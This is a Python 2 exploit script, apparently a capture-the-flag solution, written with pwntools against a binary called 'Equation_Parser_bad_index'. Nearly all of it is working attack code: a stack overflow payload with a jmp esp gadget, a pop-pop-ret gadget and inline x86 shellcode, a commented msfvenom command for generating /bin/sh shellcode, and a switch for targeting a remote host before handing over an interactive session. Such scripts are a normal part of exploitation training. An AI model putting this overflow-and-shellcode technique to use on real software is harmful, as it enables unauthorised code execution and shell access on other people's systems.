#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-23 20:25:39
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./Equation_Parser_bad_index"
remote_ip = ""
port = 0
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x08049591\nb*0x80495AC\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def gen(eip):
	ru("\n")
	# shellcode = p32(0x41424344)
	payload = "1"*(0xa+0x4)+eip
	payload +="1"*(0x100-len(payload))
	payload += shellcode
	sd(payload)
	import base64
	print base64.b64encode(payload)
# payload = p32(0x41424344)+"a"*(0x112-0x14)+p32(0)+p32(0)+p32(0)+"a"*0xc+p32(0x78777675)+p32(0x080eb060)
# payload  = "\x08"*0x1b+p32(0x78777675)+p32(0x080eb060)+p32(0x41424344)
pp_ret = 0x080bf3cf
jmp_esp  = 0x080e3b67
shellcode = "\x31\xdb\xf7\xe3\x53h@\xa0\x0e\x08Y\xb2\x04\xb0\x03\xcd\x80"
payload  = "\x08"*(0x1b-0xc)+p32(jmp_esp)+shellcode
payload += "\x08"*(len(p32(jmp_esp)+shellcode)+0x1b+0xd)+p32(pp_ret)
# +p32(0x78777675)+p32(0x080eb060)+p32(0x41424344)
import base64
print base64.b64encode(payload)
sl(payload)
p.interactive()

